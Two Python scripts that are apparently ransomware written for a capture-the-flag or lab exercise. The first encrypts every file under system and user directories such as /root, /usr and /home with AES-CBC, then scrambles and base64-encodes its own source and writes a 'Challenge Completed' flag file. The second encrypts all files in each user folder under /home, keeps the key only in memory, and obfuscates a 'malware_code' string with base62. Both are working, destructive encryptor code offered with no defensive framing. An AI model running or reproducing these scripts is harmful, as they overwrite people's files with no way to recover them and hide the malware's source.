import os
import sys
import base64
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from multiprocessing import Process

def generate_key():
    salt = os.urandom(16)
    password = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key, salt, password

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

def process_files(directories, excluded_files, key):
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file not in excluded_files:
                        encrypt_file(os.path.join(root, file), key)

def hide_key_file(key_file_path):
    while True:
        pass

def reverse_and_obfuscate_script(script_path):
    with open(script_path, "r") as f:
        script = f.read()
    reversed_script = script[::-1]
    shuffled = list(reversed_script)
    random.shuffle(shuffled)
    index_map = {i: shuffled.index(char) for i, char in enumerate(reversed_script)}
    obfuscated_script = "".join(shuffled)
    encoded_script = base64.b64encode(obfuscated_script.encode()).decode()
    with open(script_path, "w") as f:
        f.write(encoded_script + "-f{" + ",".join(map(str, index_map.values())) + "}")

def main():
    key, salt, password = generate_key()
    key_file_path = "keyfile"
    excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
    target_folders = ["/root", "/usr", "/home", "/Documents", "/Downloads", "/var/gui"]
    
    with open(key_file_path, "wb") as f:
        f.write(key)
    
    parent_process = Process(target=hide_key_file, args=(key_file_path,))
    parent_process.start()
    
    process_files(target_folders, excluded_files, key)
    reverse_and_obfuscate_script(sys.argv[0])
    
    with open("/tmp/.flag.txt", "w") as f:
        f.write("Challenge Completed")

if __name__ == "__main__":
    main()



```
import os
import random
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base62  # Import the base62 library

# === Step 0: Setup
home_dir = "/home"
key_filename = "key.horcrux"
ram_store = {}

# === Step 1: Generate AES key & IV
key = get_random_bytes(32)
iv = get_random_bytes(16)
ram_store["key"] = key
ram_store["iv"] = iv

# === Step 2: Encryption Functions
def pad(data):
    pad_len = 16 - len(data) % 16
    return data + bytes([pad_len] * pad_len)

def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data))
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        print(f"[+] Encrypted: {file_path}")
    except:
        print(f"[!] Failed to encrypt: {file_path}")

def encrypt_user_folder(user_folder):
    for root, dirs, files in os.walk(user_folder):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)

# === Step 3: Loop Through All Users in /home
for user in os.listdir(home_dir):
    user_path = os.path.join(home_dir, user)
    if os.path.isdir(user_path):
        print(f"\n[*] Encrypting folder: {user_path}")
        encrypt_user_folder(user_path)

# === Step 4: Delete key from disk (simulated)
if os.path.exists(key_filename):
    os.remove(key_filename)

# === Step 5: Rearranged Malware Code Obfuscation
def rearrange_and_map(data: str):
    indices = list(range(len(data)))
    shuffled = indices[:]
    random.shuffle(shuffled)
    rearranged = ''.join([data[i] for i in shuffled])
    return rearranged, shuffled

malware_code = "def horcrux(): pass  # hidden evil"
rearranged, index_map = rearrange_and_map(malware_code)

# === Base62 with the base62 library ===
rearranged_b64 = base62.encodebytes(rearranged.encode())  # Use base62 encoding
index_map_b62 = [base62.encode(i) for i in index_map]  # Map the indices to Base62

print("\n== Final Horcrux Dump ==")
print(f"Rearranged (Base62): {rearranged_b64}")
print(f"Index Map (Base62): {index_map_b62}")
```
